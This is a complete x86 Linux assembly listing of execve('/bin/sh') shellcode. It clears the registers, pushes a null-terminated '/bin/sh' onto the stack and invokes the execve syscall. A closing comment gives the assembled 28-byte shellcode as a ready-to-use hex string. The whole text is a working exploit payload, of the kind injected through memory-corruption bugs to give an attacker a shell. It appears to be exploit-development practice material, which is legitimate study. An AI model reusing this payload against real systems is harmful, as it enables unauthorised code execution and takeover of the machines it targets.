section .text

global _start
_start:
  
   xor   eax,  eax	;clearing eax
   xor   ebx,  ebx	;clearing ebx
   xor   edx,  edx	;clearing edx
   xor   ecx,  ecx	;clearing ecx
   mov   al,   11	;moving execve code to eax
   push  0x4e68732f	;pushing /bin/sh in little endian format
   push  0x6e69622f	
   mov   [esp+7], cl	;adding a \x00 after /bin/sh
   mov   ebx,  esp	;loading address of /bin/sh in ebx
   int   0x80		;calling system

; shellcode = "\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x0b\x68\x2f\x73\x68\x4e\x68\x2f\x62\x69\x6e\x88\x4c\x24\x07\x89\xe3\xcd\x80"
; shellcode length=28
